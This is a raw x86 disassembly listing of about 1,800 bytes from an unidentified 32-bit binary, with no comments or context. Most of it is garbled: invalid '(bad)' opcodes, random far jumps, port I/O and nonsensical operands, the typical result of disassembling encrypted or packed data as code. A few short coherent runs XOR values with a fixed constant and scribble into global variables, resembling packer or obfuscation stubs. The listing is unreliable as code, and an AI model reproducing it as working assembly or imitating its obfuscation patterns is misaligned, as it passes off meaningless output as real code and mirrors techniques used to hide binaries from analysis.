  40e3d5:	jp     0x40e37f
  40e3d7:	push   ebx
  40e3d8:	sub    BYTE PTR [ebx-0x14],ch
  40e3db:	(bad)  
  40e3dc:	enter  0xf29e,0x1c
  40e3e0:	xor    DWORD PTR [eax+0x26],edi
  40e3e3:	out    dx,eax
  40e3e4:	sbb    eax,0xdd78a6e7
  40e3e9:	ret    
  40e3ea:	xor    BYTE PTR [edi+edx*2],ah
  40e3ed:	xchg   ah,ah
  40e3ef:	iret   
  40e3f0:	jae    0x40e386
  40e3f2:	fucomi st,st(0)
  40e3f4:	scas   al,BYTE PTR es:[edi]
  40e3f5:	add    edx,DWORD PTR [ecx]
  40e3f7:	inc    ebp
  40e3f8:	stc    
  40e3f9:	inc    ebx
  40e3fa:	je     0x40e470
  40e3fc:	sahf   
  40e3fd:	or     ebx,ecx
  40e3ff:	xor    DWORD PTR [esi+0x2ab19214],esp
  40e405:	test   BYTE PTR [eax+0x1dd8fb0b],0x21
  40e40c:	inc    esi
  40e40d:	jmp    FWORD PTR [ecx+0x1bc48673]
  40e413:	or     al,0x23
  40e415:	aas    
  40e416:	inc    eax
  40e417:	mov    bh,0x7a
  40e419:	mov    esi,0x9db11fc5
  40e41e:	cmp    al,0x1c
  40e420:	inc    esi
  40e421:	not    DWORD PTR [esi+0x6f1727]
  40e427:	add    al,0x8b
  40e429:	bound  eax,QWORD PTR [ecx+0x1b]
  40e42c:	xor    al,BYTE PTR [eax-0x23dc19b4]
  40e432:	add    eax,0x91b7eeb9
  40e437:	sbb    DWORD PTR [ecx],0xffffffd6
  40e43a:	dec    edx
  40e43b:	sbb    eax,0x37521f6e
  40e440:	in     al,0x26
  40e442:	sbb    bl,BYTE PTR es:[ebp+0xea5d63a]
  40e449:	mov    BYTE PTR [ecx-0x51],bh
  40e44c:	mov    fs,WORD PTR ds:0xc735c144
  40e452:	je     0x40fd56
  40e458:	movzx  eax,BYTE PTR ds:0x434382
  40e45f:	add    DWORD PTR ds:0x43441d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432dda,0x4326f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432dc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434392,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	aam    0xf4
  40e4bb:	add    edx,DWORD PTR [edi-0x2e]
  40e4be:	sahf   
  40e4bf:	jo     0x40e531
  40e4c1:	dec    ecx
  40e4c2:	jge    0x40e534
  40e4c4:	jo     0x40e46c
  40e4c6:	outs   dx,BYTE PTR ds:[esi]
  40e4c7:	add    ebx,ebp
  40e4c9:	jmp    0xf364:0x2c416a71
  40e4d0:	imul   eax,DWORD PTR [edx],0xffffff86
  40e4d3:	call   0x8fe4:0xd35a4aaa
  40e4da:	push   edi
  40e4db:	ins    DWORD PTR es:[edi],dx
  40e4dc:	mov    ebp,0xb4ab4dc0
  40e4e1:	in     eax,0xf0
  40e4e3:	(bad)  
  40e4e5:	mov    eax,0xaec439a0
  40e4ea:	fwait
  40e4eb:	into   
  40e4ec:	add    BYTE PTR [eax-0x57],cl
  40e4ef:	mov    eax,ds:0xde62ba56
  40e4f4:	jb     0x40e4fb
  40e4f6:	cmp    eax,DWORD PTR [ecx-0x67]
  40e4f9:	idiv   DWORD PTR [bx+di+0x5f3f]
  40e4fe:	jmp    0x40e4ce
  40e500:	retf   
  40e501:	push   es
  40e502:	int    0x5b
  40e504:	test   al,0x6d
  40e506:	inc    ebx
  40e507:	jmp    0xf49f:0x99003707
  40e50e:	sub    al,0x96
  40e510:	lds    esi,FWORD PTR [esi-0x22df8c4f]
  40e516:	push   0xffffff97
  40e518:	mov    BYTE PTR [eax],dh
  40e51a:	fiadd  DWORD PTR [edi-0x5a6f5fb1]
  40e520:	jp     0x40e555
  40e522:	outs   dx,BYTE PTR ds:[esi]
  40e523:	fucomi st,st(7)
  40e525:	test   edx,eax
  40e527:	mov    esi,eax
  40e529:	repnz mov edx,ebp
  40e52c:	fidivr DWORD PTR [edi-0x10970798]
  40e532:	jg     0x40e53d
  40e534:	cdq    
  40e535:	xor    BYTE PTR [ebx+0x4c],ch
  40e538:	lea    esi,[esp+ecx*8+0x36]
  40e53c:	inc    edi
  40e53d:	mov    bl,0x83
  40e53f:	mov    esi,es
  40e541:	cdq    
  40e542:	dec    ebp
  40e543:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e545:	inc    ebp
  40e546:	jo     0x40e55b
  40e548:	sbb    ecx,DWORD PTR [eax-0x10]
  40e54b:	mov    dh,bl
  40e54d:	pop    ecx
  40e54e:	in     al,0x89
  40e550:	and    al,0xbf
  40e552:	add    esp,esi
  40e554:	ja     0x40e570
  40e556:	sub    eax,0x11cef036
  40e55b:	stos   DWORD PTR es:[edi],eax
  40e55c:	sub    DWORD PTR [ebx+0x1b],ebx
  40e55f:	inc    esi
  40e560:	mov    ebp,0x4e49b52f
  40e565:	dec    DWORD PTR [edi]
  40e567:	retf   0x57b7
  40e56a:	and    DWORD PTR [esi],esp
  40e56c:	add    BYTE PTR [ecx+edx*8+0x4b466395],bh
  40e573:	inc    ecx
  40e574:	sub    al,BYTE PTR [edi+0x4e]
  40e577:	mov    edi,0xf04a4aa2
  40e57c:	cmovb  edi,DWORD PTR [esi-0x143d801e]
  40e583:	jae    0x40e59b
  40e585:	call   0x4f9dbc26
  40e58a:	sbb    BYTE PTR [esp+ebx*4-0x7683e1c4],bl
  40e591:	adc    al,0xd5
  40e593:	loop   0x40e5bc
  40e595:	aaa    
  40e596:	mov    al,0x61
  40e598:	fs sbb al,0x68
  40e59b:	icebp  
  40e59c:	rcl    BYTE PTR [esi+0x2fa5eddb],0xcb
  40e5a3:	ds mov cl,0x9
  40e5a6:	mov    esp,0x87758c91
  40e5ab:	loopne 0x40e61a
  40e5ad:	adc    bl,BYTE PTR [edi]
  40e5af:	push   0xfb5923ae
  40e5b4:	cmp    eax,0x27377c84
  40e5b9:	inc    esi
  40e5ba:	cld    
  40e5bb:	pop    ds
  40e5bc:	mov    ebx,0x729d59fd
  40e5c1:	cmp    edi,DWORD PTR [edi+ebx*4+0x33]
  40e5c5:	repz retf 
  40e5c7:	loope  0x40e5d3
  40e5c9:	inc    eax
  40e5ca:	and    eax,0xcee8daf1
  40e5cf:	jp     0x40e61b
  40e5d1:	icebp  
  40e5d2:	xchg   ebp,eax
  40e5d3:	arpl   WORD PTR [edx+0x54],cx
  40e5d6:	loope  0x40e5b7
  40e5d8:	into   
  40e5d9:	test   DWORD PTR [eax-0x23add8a8],esp
  40e5df:	xchg   edx,eax
  40e5e0:	in     eax,0xdc
  40e5e2:	das    
  40e5e3:	xchg   esi,eax
  40e5e4:	lea    ecx,[edi]
  40e5e6:	dec    ebx
  40e5e7:	push   0x13b8784f
  40e5ec:	shl    edi,0x97
  40e5ef:	or     esi,DWORD PTR [ebx-0x17]
  40e5f2:	out    0xfb,al
  40e5f4:	or     BYTE PTR [ebx+0x49d4644e],bl
  40e5fa:	scas   al,BYTE PTR es:[edi]
  40e5fb:	and    ecx,ebp
  40e5fd:	aas    
  40e5fe:	lods   eax,DWORD PTR ds:[esi]
  40e5ff:	out    0xee,al
  40e601:	stos   BYTE PTR es:[edi],al
  40e602:	sub    esi,DWORD PTR [eax+0x32]
  40e605:	addr16 inc eax
  40e607:	call   0x8c29:0x3786460f
  40e60e:	mov    dh,0x78
  40e610:	adc    BYTE PTR [ebp-0x11],dh
  40e613:	cdq    
  40e614:	cs jl  0x40e63c
  40e617:	js     0x40e5ae
  40e619:	cmp    eax,edx
  40e61b:	aaa    
  40e61c:	enter  0xcfb8,0xec
  40e620:	xchg   ebp,eax
  40e621:	xchg   ebx,eax
  40e622:	in     al,dx
  40e623:	jle    0x40e68d
  40e625:	aaa    
  40e626:	lods   al,BYTE PTR ds:[esi]
  40e627:	ret    0x5ddc
  40e62a:	pop    ds
  40e62b:	(bad)  
  40e62c:	popa   
  40e62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e62e:	stos   BYTE PTR es:[edi],al
  40e62f:	loope  0x40e65d
  40e631:	das    
  40e632:	xor    ch,bh
  40e634:	adc    cl,ch
  40e636:	test   BYTE PTR [ebx],ch
  40e638:	sti    
  40e639:	jns    0x40e5dd
  40e63b:	loopne 0x40e5fa
  40e63d:	and    ah,BYTE PTR [edx-0x6166951c]
  40e643:	cmc    
  40e644:	push   edi
  40e645:	jmp    0xd822:0x4d3b141d
  40e64c:	ret    0x2d02
  40e64f:	(bad)  
  40e650:	jo     0x40e69c
  40e652:	cmp    DWORD PTR ds:[ecx+0x183786c],esi
  40e659:	jmp    0x7a57:0x50021ba0
  40e660:	and    cl,BYTE PTR [eax]
  40e662:	scas   eax,DWORD PTR es:[edi]
  40e663:	aam    0x12
  40e665:	jle    0x40e665
  40e667:	shl    DWORD PTR [esi-0x3269661f],0x23
  40e66e:	add    BYTE PTR [eax-0x33ca37ff],al
  40e674:	test   al,0x78
  40e676:	out    0x7c,eax
  40e678:	xor    eax,0xacce4017
  40e67d:	push   ecx
  40e67e:	stc    
  40e67f:	xchg   esi,eax
  40e680:	xchg   esp,eax
  40e681:	or     DWORD PTR [ebx-0xf],eax
  40e684:	adc    al,0x67
  40e686:	jns    0x40e610
  40e688:	jns    0x40e66e
  40e68a:	icebp  
  40e68b:	sti    
  40e68c:	xchg   ebp,eax
  40e68d:	pop    ebp
  40e68e:	retf   
  40e68f:	loopne 0x40e68b
  40e691:	shr    DWORD PTR [ebx-0x23b0a67b],0xed
  40e698:	dec    esp
  40e699:	mov    eax,ds:0xf9341179
  40e69e:	dec    esp
  40e69f:	mov    al,0xed
  40e6a1:	jge    0x40e655
  40e6a3:	mov    ebp,0xe0c84446
  40e6a8:	aas    
  40e6a9:	shl    BYTE PTR [edx+eax*8],1
  40e6ac:	mov    esi,0x585d8767
  40e6b1:	neg    BYTE PTR [eax]
  40e6b3:	xchg   DWORD PTR [edx+eax*1-0x71f8025b],eax
  40e6ba:	shr    BYTE PTR [ebp+0xf7340c1],0xb7
  40e6c1:	mov    esi,0x4d8fe821
  40e6c6:	outs   dx,BYTE PTR ds:[esi]
  40e6c7:	pop    ecx
  40e6c8:	jp     0x40e698
  40e6ca:	dec    esp
  40e6cb:	lds    eax,FWORD PTR [eiz*8-0x79943c5c]
  40e6d2:	sbb    edi,DWORD PTR [edi-0x77a0a80f]
  40e6d8:	xchg   DWORD PTR [eax-0x56a1c591],edi
  40e6de:	push   edx
  40e6df:	nop
  40e6e0:	int    0x1c
  40e6e2:	adc    eax,0xa3161d57
  40e6e7:	bound  eax,QWORD PTR [ebx]
  40e6e9:	xchg   edi,eax
  40e6ea:	xchg   edx,eax
  40e6eb:	in     eax,dx
  40e6ec:	xchg   esi,eax
  40e6ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ee:	jge    0x40e690
  40e6f0:	push   ebx
  40e6f1:	pop    esp
  40e6f2:	mov    al,BYTE PTR es:[esi]
  40e6f5:	pop    esi
  40e6f6:	nop
  40e6f7:	xchg   ebp,eax
  40e6f8:	adc    ch,BYTE PTR [eax+0x199efde5]
  40e6fe:	nop
  40e6ff:	call   0xb479:0xa613d5d6
  40e706:	loopne 0x40e6a3
  40e708:	xchg   esi,eax
  40e709:	or     al,0x1e
  40e70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e70c:	repnz outs dx,DWORD PTR ds:[esi]
  40e70e:	inc    ecx
  40e70f:	dec    eax
  40e710:	cdq    
  40e711:	sub    BYTE PTR [eax-0x77],al
  40e714:	cmc    
  40e715:	inc    edx
  40e716:	lds    eax,FWORD PTR [ecx+0x31]
  40e719:	push   ss
  40e71a:	cmp    ebp,DWORD PTR [esi+0x37]
  40e71d:	dec    ebp
  40e71e:	add    al,0xfb
  40e720:	outs   dx,BYTE PTR ds:[esi]
  40e721:	or     eax,DWORD PTR [esi+0x1c81a3e0]
  40e727:	push   ebp
  40e728:	arpl   WORD PTR [eax-0x13f36688],ax
  40e72e:	aaa    
  40e72f:	inc    eax
  40e730:	sbb    al,0x56
  40e732:	adc    al,0x22
  40e734:	mov    DWORD PTR ds:[esi],esi
  40e737:	inc    ebx
  40e738:	lahf   
  40e739:	repz jmp 0x40e72e
  40e73c:	loopne 0x40e79a
  40e73e:	or     al,0xde
  40e740:	addr16 cdq 
  40e742:	sub    dh,ch
  40e744:	mov    al,ds:0x3690a9cf
  40e749:	push   eax
  40e74a:	pop    edi
  40e74b:	mov    esp,0x9bc079c
  40e750:	nop
  40e751:	cmc    
  40e752:	mov    cl,BYTE PTR [esi]
  40e754:	mov    ch,0xf5
  40e756:	ror    DWORD PTR [edi+0xb],1
  40e759:	and    ecx,DWORD PTR [eax+0x7]
  40e75c:	adc    BYTE PTR [edi-0x60175db3],ch
  40e762:	mov    esp,eax
  40e764:	lock mov ebp,0x821852bc
  40e76a:	or     al,0xb5
  40e76c:	or     eax,0x6ee1676e
  40e771:	retf   
  40e772:	stos   BYTE PTR es:[edi],al
  40e773:	mov    ch,0xdf
  40e775:	mov    eax,DWORD PTR [edi+0x63]
  40e778:	fst    DWORD PTR [esi]
  40e77a:	test   al,0x2d
  40e77c:	dec    ebx
  40e77d:	(bad)  
  40e77e:	jb     0x40e7d3
  40e780:	cmp    edx,DWORD PTR [ebp-0x31]
  40e783:	or     al,0x33
  40e785:	fsub   QWORD PTR [edi-0x18]
  40e788:	aaa    
  40e789:	cmc    
  40e78a:	dec    BYTE PTR [edi+0x77]
  40e78d:	mov    ds:0x489a3f9a,al
  40e792:	in     eax,dx
  40e793:	dec    ebp
  40e794:	mov    al,0x7b
  40e796:	xor    DWORD PTR [edx-0x1b],0xffffff99
  40e79a:	cdq    
  40e79b:	sbb    BYTE PTR [ebp+0x63],dh
  40e79e:	mov    bl,0x38
  40e7a0:	pop    ebp
  40e7a1:	stos   BYTE PTR es:[edi],al
  40e7a2:	mov    WORD PTR [ebx+0x5f],ss
  40e7a5:	cld    
  40e7a6:	sti    
  40e7a7:	and    al,0xbd
  40e7a9:	mov    edi,0xec736b0c
  40e7ae:	imul   esp,DWORD PTR ss:[ebp+0x31f71520],0x959cd619
  40e7b9:	enter  0xe1cb,0x94
  40e7bd:	loop   0x40e833
  40e7bf:	sbb    dl,BYTE PTR [edi+edi*8+0x235a7bdd]
  40e7c6:	clc    
  40e7c7:	shl    BYTE PTR [eax+ebp*2+0xdaa263b],cl
  40e7ce:	ja     0x40e7f5
  40e7d0:	test   eax,0xced274b5
  40e7d5:	retf   
  40e7d6:	jecxz  0x40e7eb
  40e7d8:	je     0x40e7cd
  40e7da:	ja     0x40e7d2
  40e7dc:	jo     0x40e7df
  40e7de:	xchg   DWORD PTR [edx+0x6e],edx
  40e7e1:	add    BYTE PTR [esi+edx*8+0x21],cl
  40e7e5:	out    0xae,al
  40e7e7:	rol    DWORD PTR [edx+edi*4],0x7b
  40e7eb:	lds    ebp,FWORD PTR [ebx-0x1b]
  40e7ee:	aam    0xc5
  40e7f0:	je     0x40e7e6
  40e7f2:	outs   dx,BYTE PTR ds:[esi]
  40e7f3:	sub    bh,bh
  40e7f5:	fiadd  DWORD PTR [esi]
  40e7f7:	loope  0x40e85c
  40e7f9:	jl     0x40e809
  40e7fb:	or     al,0x0
  40e7fd:	push   0xfffffff5
  40e7ff:	pop    ebx
  40e800:	mov    DWORD PTR [ebx+0x15],edx
  40e803:	sbb    ebp,DWORD PTR [esi]
  40e805:	jg     0x40e7d5
  40e807:	jnp    0x40e7ab
  40e809:	dec    ebp
  40e80a:	stos   BYTE PTR es:[edi],al
  40e80b:	mov    esi,0xa417d383
  40e810:	rol    dl,cl
  40e812:	das    
  40e813:	add    BYTE PTR [edx-0x5a],bh
  40e816:	in     al,dx
  40e817:	mov    cl,0x8b
  40e819:	mov    ecx,0x91649afe
  40e81e:	mov    edi,0xa705578d
  40e823:	iret   
  40e824:	das    
  40e825:	scas   eax,DWORD PTR es:[edi]
  40e826:	shl    cl,cl
  40e828:	add    al,0x4a
  40e82a:	jns    0x40e88d
  40e82c:	std    
  40e82d:	mov    dh,0xcc
  40e82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e830:	imul   esp,DWORD PTR [ecx+0x18684c56],0xa8bcbb11
  40e83a:	pop    ss
  40e83b:	ja     0x40e7e3
  40e83d:	pop    esi
  40e83e:	jne    0x40e8a1
  40e840:	out    dx,al
  40e841:	jmp    0xb1d64f4a
  40e846:	and    eax,0xb7f3ade2
  40e84b:	add    eax,0x1d07aa8c
  40e850:	cli    
  40e851:	adc    BYTE PTR [ecx],ch
  40e853:	xchg   edx,eax
  40e854:	ss pop esi
  40e856:	sbb    eax,0x9b408c84
  40e85b:	ins    DWORD PTR es:[edi],dx
  40e85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e85d:	dec    edx
  40e85e:	stos   DWORD PTR es:[edi],eax
  40e85f:	mov    ecx,0x942cdae6
  40e864:	inc    edi
  40e865:	pop    esp
  40e866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e867:	xchg   ebp,eax
  40e868:	mov    ecx,0xed961801
  40e86d:	jnp    0x40e860
  40e86f:	pop    esi
  40e870:	ficom  DWORD PTR [edx]
  40e872:	inc    esi
  40e873:	frstor [esi+0x73ddc1e2]
  40e879:	mov    ebp,0xae71cd42
  40e87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e87f:	pop    ecx
  40e880:	inc    ebp
  40e881:	hlt    
  40e882:	bound  esi,QWORD PTR [ecx-0x1ca248ef]
  40e888:	pop    ebp
  40e889:	ret    0x50c5
  40e88c:	mov    bh,0xc3
  40e88e:	xchg   esp,eax
  40e88f:	mov    eax,DWORD PTR [eax]
  40e891:	add    dh,cl
  40e893:	inc    esi
  40e894:	xchg   esp,eax
  40e895:	push   0x51322a53
  40e89a:	mov    ebp,0xe04d8bdb
  40e89f:	mov    esi,DWORD PTR ds:0x434455
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43439e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x4343a2,0x4326ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432dc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434411,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432dc2,0x4326f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fidivr DWORD PTR [ebx+0x30]
  40e904:	cmp    DWORD PTR [esi+0x70709a2b],ecx
  40e90a:	dec    ecx
  40e90b:	jge    0x40e97d
  40e90d:	jo     0x40e8d3
  40e90f:	lds    edi,FWORD PTR [edi+0x56e257fc]
  40e915:	not    BYTE PTR [edx+0x66]
  40e918:	test   DWORD PTR [eax],esi
  40e91a:	sbb    ebp,DWORD PTR [edx-0x63]
  40e91d:	jl     0x40e90a
  40e91f:	inc    ebx
  40e920:	push   ss
  40e921:	sbb    cl,BYTE PTR [esi+0x23]
  40e924:	fbld   TBYTE PTR [edx]
  40e926:	push   ebx
  40e927:	mov    dh,0xdb
  40e929:	fisubr DWORD PTR [ecx-0x5a]
  40e92c:	and    eax,0xc21ddede
  40e932:	add    DWORD PTR [edx-0x2025ec6a],ebx
  40e938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e939:	fnstcw WORD PTR [ebx-0x37]
  40e93c:	rcl    BYTE PTR [edi],cl
  40e93e:	add    al,0x5d
  40e940:	punpckhdq mm5,QWORD PTR ds:0xb570ce6d
  40e947:	stos   DWORD PTR es:[edi],eax
  40e948:	pusha  
  40e949:	les    ebx,FWORD PTR [ecx+0x77213373]
  40e94f:	xor    DWORD PTR [edx],ecx
  40e951:	push   ds
  40e952:	loopne 0x40e8e8
  40e954:	in     eax,dx
  40e955:	or     DWORD PTR ds:0xf98b9e74,edi
  40e95b:	xchg   esp,eax
  40e95c:	es xchg esp,eax
  40e95e:	(bad)  
  40e95f:	fidivr WORD PTR [ebx]
  40e961:	mov    BYTE PTR [edi-0x75],dl
  40e964:	sub    BYTE PTR [ebx+0x5fd9a375],0xf8
  40e96b:	fcom   DWORD PTR [esi+0x34394963]
  40e971:	popf   
  40e972:	(bad)  
  40e973:	cmp    al,0x69
  40e975:	push   cs
  40e976:	jge    0x40e93d
  40e978:	push   edi
  40e979:	pop    eax
  40e97a:	and    al,0x11
  40e97c:	(bad)  
  40e97d:	jbe    0x40e982
  40e97f:	std    
  40e980:	and    BYTE PTR [edx+eiz*2],bl
  40e983:	aad    0x10
  40e985:	add    dl,BYTE PTR [ebx-0x74]
  40e988:	std    
  40e989:	in     eax,dx
  40e98a:	sub    bl,bh
  40e98c:	sub    DWORD PTR [eax+0x29ec5cd2],ecx
  40e992:	imul   ebp,eax,0x20
  40e995:	outs   dx,BYTE PTR ds:[esi]
  40e996:	jb     0x40e9e4
  40e998:	sbb    edi,DWORD PTR [edi]
  40e99a:	xor    ebx,DWORD PTR [eax-0x41966682]
  40e9a0:	sbb    DWORD PTR [ebp+0x6db6f808],0x4df276f8
  40e9aa:	inc    ecx
  40e9ab:	cs and DWORD PTR ss:0x4b554b4d,ecx
  40e9b3:	cmc    
  40e9b4:	outs   dx,DWORD PTR ds:[esi]
  40e9b5:	mov    ds:0xc177a699,al
  40e9ba:	sahf   
  40e9bb:	mov    ch,0x18
  40e9bd:	adc    dh,dh
  40e9bf:	jg     0x40e9a9
  40e9c1:	mov    cs,WORD PTR [esp+edi*1+0xf24b795]
  40e9c8:	inc    ebp
  40e9c9:	lea    esi,[ecx]
  40e9cb:	cmc    
  40e9cc:	jne    0x40e993
  40e9ce:	call   0x78dc:0xa7be3e07
  40e9d5:	repnz adc eax,0x5e01492f
  40e9db:	add    BYTE PTR [esi-0x301bf9a6],cl
  40e9e1:	add    al,0x70
  40e9e3:	sub    ch,ch
  40e9e5:	aad    0xa7
  40e9e7:	loop   0x40e9a2
  40e9e9:	std    
  40e9ea:	mov    ch,0x70
  40e9ec:	(bad)  
  40e9ee:	adc    eax,0x5bcedfb8
  40e9f3:	pop    ebx
  40e9f4:	fld    DWORD PTR [eax]
  40e9f6:	test   al,0xae
  40e9f8:	dec    edi
  40e9f9:	(bad)  
  40e9fa:	xchg   esi,eax
  40e9fb:	imul   esi,ebp,0x3d828bfa
  40ea01:	fsubr  QWORD PTR [ebx]
  40ea03:	hlt    
  40ea04:	sbb    edx,DWORD PTR [ebp-0x6f332105]
  40ea0a:	jge    0x40e996
  40ea0c:	pop    esp
  40ea0d:	sar    BYTE PTR [esi+0x21d117b6],1
  40ea13:	jbe    0x40ea91
  40ea15:	popa   
  40ea16:	pop    eax
  40ea17:	xchg   ebp,eax
  40ea18:	xchg   ecx,eax
  40ea19:	and    eax,DWORD PTR [esi-0x1cfa0dd]
  40ea1f:	and    esi,DWORD PTR [ecx]
  40ea21:	or     esp,ebx
  40ea23:	int    0xf7
  40ea25:	je     0x40ea3b
  40ea27:	les    edi,FWORD PTR [ecx+ecx*2+0x2]
  40ea2b:	or     dl,BYTE PTR [ebx-0x3e]
  40ea2e:	and    al,0x1c
  40ea30:	enter  0x7c7f,0xc
  40ea34:	mov    eax,0x3162f65d
  40ea39:	pop    esi
  40ea3a:	gs cwde 
  40ea3c:	xor    esi,ebx
  40ea3e:	adc    al,0x82
  40ea40:	pop    esp
  40ea41:	fnstcw WORD PTR [edx+ecx*4]
  40ea44:	jg     0x40ea49
  40ea46:	dec    ebp
  40ea47:	es push eax
  40ea49:	outs   dx,DWORD PTR ds:[esi]
  40ea4a:	jecxz  0x40ea9f
  40ea4c:	sbb    al,0x47
  40ea4e:	sub    ebx,ebp
  40ea50:	fistp  QWORD PTR [ecx-0x2ec00437]
  40ea56:	push   ecx
  40ea57:	adc    ah,dh
  40ea59:	jbe    0x40ea9d
  40ea5b:	push   esp
  40ea5c:	mov    ah,0x2f
  40ea5e:	push   edi
  40ea5f:	ret    0x4a91
  40ea62:	arpl   WORD PTR [ecx+edx*1],sp
  40ea65:	popf   
  40ea66:	loopne 0x40ea09
  40ea68:	shl    DWORD PTR [edi+0x13],0x5e
  40ea6c:	fild   DWORD PTR [ebp+0x760425e3]
  40ea72:	sti    
  40ea73:	repnz push 0x2e41611d
  40ea79:	cmp    al,0xbe
  40ea7b:	ret    
  40ea7c:	test   edi,0x5b8a9483
  40ea82:	jmp    0x40ea50
  40ea84:	test   esi,esi
  40ea86:	outs   dx,BYTE PTR ds:[esi]
  40ea87:	pushf  
  40ea88:	mov    bh,0xcd
  40ea8a:	sahf   
  40ea8b:	cdq    
  40ea8c:	or     al,0xf4
  40ea8e:	or     ah,ah
  40ea90:	inc    edx
  40ea91:	jg     0x40eae2
  40ea93:	push   ebx
  40ea94:	dec    ecx
  40ea95:	sbb    bh,0x91
  40ea98:	ds popa 
  40ea9a:	shr    BYTE PTR [ebp+0x35],0xfb
  40ea9e:	(bad)  
  40ea9f:	jmp    0x23caa7d
  40eaa4:	push   0x16bc77c5
  40eaa9:	(bad)  
  40eaaa:	mov    eax,ds:0x5d144206
  40eaaf:	pop    edx
  40eab0:	xchg   BYTE PTR [ebx],dh
  40eab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab3:	ins    DWORD PTR es:[edi],dx
  40eab4:	and    al,0x11
  40eab6:	cmp    al,0x19
  40eab8:	sbb    DWORD PTR [edx+0x14b020cf],ebx
  40eabe:	or     ebp,edi
  40eac0:	ficom  DWORD PTR [ebp+ebp*2+0x5eccb5fc]
  40eac7:	xor    ebp,ebp
  40eac9:	lock mov ah,0x90
  40eacc:	ins    BYTE PTR es:[edi],dx
  40eacd:	retf   
  40eace:	adc    BYTE PTR [esi],ch
  40ead0:	ja     0x40eb0d
  40ead2:	jecxz  0x40eb0b
  40ead4:	(bad)  
  40ead5:	jb     0x40eaf5
  40ead7:	pop    ebx
  40ead8:	(bad)  
  40eada:	mov    WORD PTR [esi-0x69],gs
  40eadd:	fdivrp st(2),st
  40eadf:	jecxz  0x40ea66
  40eae1:	xor    BYTE PTR [ebx+0x2231483e],al
  40eae7:	mov    bl,0xcf
  40eae9:	test   eax,0x9508c419
  40eaee:	pushf  
  40eaef:	jg     0x40eb15
  40eaf1:	pop    ss
  40eaf2:	pusha  
  40eaf3:	push   ds
  40eaf4:	mov    ds:0xaf84e0b6,eax
  40eaf9:	mov    ebp,0x4d021e04
  40eafe:	cmp    esi,esi
  40eb00:	and    BYTE PTR [edi+edx*8+0x51de832f],0xdd
  40eb08:	cld    
  40eb09:	jne    0x40eb6d
  40eb0b:	les    ebp,FWORD PTR [esi]
  40eb0d:	push   ebp
  40eb0e:	sar    DWORD PTR [esi+ebp*2+0x4e3823d8],0x10
  40eb16:	rcl    DWORD PTR [edx-0x39],0x41
  40eb1a:	pusha  
  40eb1b:	pushf  
  40eb1c:	jmp    0xa536:0x3ab2b27a
  40eb23:	xor    DWORD PTR [esi-0x48],edx
  40eb26:	imul   DWORD PTR [ebx+0x68]
  40eb29:	jo     0x40eb98
  40eb2b:	fdiv   DWORD PTR [ebx-0x12]
  40eb2e:	cmp    esp,esp
  40eb30:	dec    esp
  40eb31:	and    dh,BYTE PTR [edi+esi*1+0x2c]
  40eb35:	aad    0x2
  40eb37:	mov    ebx,0x7c310ec4
  40eb3c:	cmp    cl,ah
  40eb3e:	jecxz  0x40eb16
  40eb40:	sbb    esp,edx
  40eb42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb43:	mov    WORD PTR [edi],cs
  40eb45:	gs fwait
  40eb47:	push   edx
  40eb48:	sbb    ebx,DWORD PTR [ebp+0x3b16ebb2]
  40eb4e:	push   0xffffff8b
  40eb50:	fild   DWORD PTR cs:[edi-0x72bac734]
  40eb57:	cli    
  40eb58:	call   0xb60e:0x10fb468a
  40eb5f:	dec    eax
  40eb60:	pop    ebx
  40eb61:	cs daa 
  40eb63:	test   al,0xa8
  40eb65:	mov    bh,0xbe
  40eb67:	jecxz  0x40eb77
  40eb69:	or     esp,DWORD PTR [esi+0x2]
  40eb6c:	pop    eax
  40eb6d:	aad    0xc
  40eb6f:	leave  
  40eb70:	js     0x40eb2f
  40eb72:	xchg   ebx,esi
  40eb74:	mov    ebx,0x64147832
  40eb79:	xchg   ebx,eax
  40eb7a:	xchg   ebx,eax
  40eb7b:	pop    esi
  40eb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7d:	shl    DWORD PTR [esi+0x6a34b308],1
  40eb83:	fisubr WORD PTR [eax]
  40eb85:	je     0x40eb4f
